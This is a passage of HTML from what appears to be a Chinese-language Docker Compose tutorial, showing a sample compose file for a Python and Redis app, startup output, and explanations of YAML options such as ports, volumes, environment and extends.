hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c55508636029-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c55508636029-11\">11</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-1\"><span class=\"crayon-s \">web</span><span class=\"\">:</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-2\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">build</span><span class=\"\">:.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-3\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">command</span><span class=\"\">: python app.py</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-4\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">ports</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-5\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span><span class=\"crayon-i \">\"5000:5000\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-6\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">volumes</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-7\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span><span class=\"crayon-o\">.</span><span class=\"\">:/code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-8\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">links</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-9\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>-<span class=\"crayon-h\"> </span>redis</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c55508636029-10\"><span class=\"crayon-s \">redis</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c55508636029-11\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">image</span><span class=\"\">: redis</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0007 seconds] -->\n<p></p>\n<p><strong>第三步</strong>，执行<code>docker-compose up</code>来启动你的应用，它会根据compose.yaml的设置来pull/run这俩个容器，然后再启动。</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c5a806091571\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">Creating myapp_redis_1...\nCreating myapp_web_1...\nBuilding web...\nStep 0 : FROM python:2.7\n2.7: Pulling from python\n...\nStatus: Downloaded newer image for python:2.7\n ---&gt; d833e0b23482\nStep 1 : ADD . /code\n ---&gt; 1c04b1b15808\nRemoving intermediate container 9dab91b4410d\nStep 2 : WORKDIR /code\n ---&gt; Running in f495a62feac9\n ---&gt; ffea89a7b090\nAttaching to myapp_redis_1, myapp_web_1\n......\nredis_1 | [1] 17 May 10:42:38.147 * The server is now ready to accept connections on port 6379\nweb_1   |  * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)\nweb_1   |  * Restarting with stat</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c5a806091571-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c5a806091571-19\">19</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-1\"><span class=\"crayon-e\">Creating </span><span class=\"crayon-v\">myapp_redis_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-2\"><span class=\"crayon-e\">Creating </span><span class=\"crayon-v\">myapp_web_1</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-3\"><span class=\"crayon-e\">Building </span><span class=\"crayon-v\">web</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-4\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">FROM </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-5\"><span class=\"crayon-cn\">2.7</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Pulling </span><span class=\"crayon-e\">from </span><span class=\"crayon-i\">python</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-6\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-7\"><span class=\"crayon-v\">Status</span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Downloaded </span><span class=\"crayon-e\">newer </span><span class=\"crayon-e\">image </span><span class=\"crayon-st\">for</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">python</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">2.7</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-8\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">d833e0b23482</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-9\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">ADD</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">.</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-10\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1c04b1b15808</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-11\"><span class=\"crayon-e\">Removing </span><span class=\"crayon-e\">intermediate </span><span class=\"crayon-i\">container</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">9dab91b4410d</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-12\"><span class=\"crayon-i\">Step</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">2</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">WORKDIR</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">code</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-13\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Running </span><span class=\"crayon-st\">in</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">f495a62feac9</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-14\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">--</span><span class=\"crayon-o\">-&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">ffea89a7b090</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-15\"><span class=\"crayon-e\">Attaching </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myapp_redis_1</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">myapp_web</span><span class=\"crayon-sy\">_</span>1</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-16\"><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span><span class=\"crayon-sy\">.</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-17\"><span class=\"crayon-v\">redis_1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">[</span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">17</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">May</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">10</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">42</span><span class=\"crayon-o\">:</span><span class=\"crayon-cn\">38.147</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">The </span><span class=\"crayon-e\">server </span><span class=\"crayon-st\">is</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">now </span><span class=\"crayon-e\">ready </span><span class=\"crayon-st\">to</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">accept </span><span class=\"crayon-e\">connections </span><span class=\"crayon-e\">on </span><span class=\"crayon-i\">port</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">6379</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c5a806091571-18\"><span class=\"crayon-v\">web_1</span><span class=\"crayon-h\">&nbsp;&nbsp; </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Running </span><span class=\"crayon-e\">on </span><span class=\"crayon-v\">http</span><span class=\"crayon-o\">:</span><span class=\"crayon-c\">//0.0.0.0:5000/ (Press CTRL+C to quit)</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c5a806091571-19\"><span class=\"crayon-v\">web_1</span><span class=\"crayon-h\">&nbsp;&nbsp; </span><span class=\"crayon-o\">|</span><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Restarting </span><span class=\"crayon-e\">with </span><span class=\"crayon-v\">stat</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0039 seconds] -->\n<p></p>\n<h2>3. Yaml文件参考</h2>\n<p>在上面的yaml文件中，我们可以看到compose文件的基本结构。首先是定义一个服务名，下面是yaml服务中的一些选项条目：<br>\n<code>image</code>:镜像的ID<br>\n<code>build</code>:直接从pwd的Dockerfile来build，而非通过image选项来pull<br>\n<code>links</code>：连接到那些容器。每个占一行，格式为SERVICE[:ALIAS],例如 – db[:database]<br>\n<code>external_links</code>：连接到该compose.yaml文件之外的容器中，比如是提供共享或者通用服务的容器服务。格式同links<br>\n<code>command</code>：替换默认的command命令<br>\n<code>ports</code>: 导出端口。格式可以是：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c61341321587\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">ports:-\"3000\"-\"8000:8000\"-\"127.0.0.1:8001:8001\"</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c61341321587-1\">1</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c61341321587-1\"><span class=\"crayon-v\">ports</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">\"3000\"</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">\"8000:8000\"</span><span class=\"crayon-o\">-</span><span class=\"crayon-s\">\"127.0.0.1:8001:8001\"</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0005 seconds] -->\n<p></p>\n<p><code>expose</code>：导出端口，但不映射到宿主机的端口上。它仅对links的容器开放。格式直接指定端口号即可。<br>\n<code>volumes</code>：加载路径作为卷，可以指定只读模式：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c65962076142\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">volumes:-/var/lib/mysql\n - cache/:/tmp/cache\n -~/configs:/etc/configs/:ro</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c65962076142-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c65962076142-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c65962076142-3\">3</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c65962076142-1\"><span class=\"crayon-v\">volumes</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">/</span><span class=\"crayon-t\">var</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">lib</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">mysql</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c65962076142-2\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cache</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">tmp</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">cache</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c65962076142-3\"><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-o\">~</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">configs</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">etc</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">configs</span><span class=\"crayon-o\">/</span><span class=\"crayon-o\">:</span><span class=\"crayon-v\">ro</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0009 seconds] -->\n<p></p>\n<p><code>volumes_from</code>：加载其他容器或者服务的所有卷</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c69471704775\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">environment:- RACK_ENV=development\n  - SESSION_SECRET</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c69471704775-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c69471704775-2\">2</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c69471704775-1\"><span class=\"crayon-v\">environment</span><span class=\"crayon-o\">:</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">RACK_ENV</span><span class=\"crayon-o\">=</span><span class=\"crayon-v\">development</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c69471704775-2\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">SESSION_SECRET</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0005 seconds] -->\n<p></p>\n<p><code>env_file</code>：从一个文件中导入环境变量，文件的格式为RACK_ENV=development<br>\n<code>extends</code>:扩展另一个服务，可以覆盖其中的一些选项。一个sample如下：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c6e528736605\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" style=\"tab-size: 4; font-size: 12px !important; line-height: 15px !important; z-index: 0; opacity: 0; overflow: hidden;\">common.yml\nwebapp:\n  build:./webapp\n  environment:- DEBUG=false- SEND_EMAILS=false\ndevelopment.yml\nweb:extends:\n    file: common.yml\n    service: webapp\n  ports:-\"8000:8000\"\n  links:- db\n  environment:- DEBUG=true\ndb:\n  image: postgres</textarea></div>\n\t\t\t<div class=\"crayon-main\" style=\"position: relative; z-index: 1; overflow: hidden;\">\n\t\t\t\t<table class=\"crayon-table\">\n\t\t\t\t\t<tbody><tr class=\"crayon-row\">\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 12px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-580270f9a8c6e528736605-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-580270f9a8c6e528736605-13\">13</div></div>\n\t\t\t\t</td>\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-1\">common<span class=\"crayon-o\">.</span>yml</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-2\"><span class=\"crayon-s \">webapp</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-3\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">build</span><span class=\"\">:./webapp</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-4\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">environment</span><span class=\"\">:- DEBUG=false- SEND_EMAILS=false</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-5\">development<span class=\"crayon-o\">.</span>yml</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-6\"><span class=\"crayon-s \">web</span><span class=\"\">:extends</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-7\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-s \">file</span><span class=\"\">: common.yml</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-8\"><span class=\"crayon-h\">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class=\"crayon-s \">service</span><span class=\"\">: webapp</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-9\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">ports</span><span class=\"\">:-\"8000</span><span class=\"\">:8000\"</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-10\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">links</span><span class=\"\">:- db</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-11\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">environment</span><span class=\"\">:- DEBUG=true</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-580270f9a8c6e528736605-12\"><span class=\"crayon-s \">db</span><span class=\"\">:</span></div><div class=\"crayon-line\" id=\"crayon-580270f9a8c6e528736605-13\"><span class=\"crayon-h\">&nbsp;&nbsp;</span><span class=\"crayon-s \">image</span><span class=\"\">: postgres</span></div></div></td>\n\t\t\t\t\t</tr>\n\t\t\t\t</tbody></table>\n\t\t\t</div>\n\t\t</div>\n<!-- [Format Time: 0.0008 seconds] -->\n<p></p>\n<p><code>net</code>：容器的网络模式，可以为”bridge”, “none”, “container:[name or id]”, “host”中的一个。<br>\n<code>dns</code>：可以设置一个或多个自定义的DNS地址。<br>\n<code>dns_search</code>:可以设置一个或多个DNS的扫描域。<br>\n其他的<code>working_dir, entrypoint, user, hostname, domainname, mem_limit, privileged, restart, stdin_open, tty, cpu_shares</code>，和<code>docker run</code>命令是一样的，这些命令都是单行的命令。例如：</p>\n<p></p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->\n\n\t\t<div id=\"crayon-580270f9a8c72058180962\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate\" data-settings=\" minimize scroll-mouseover\" style=\"margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important; height: auto;\">\n\t\t\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly=\"\" 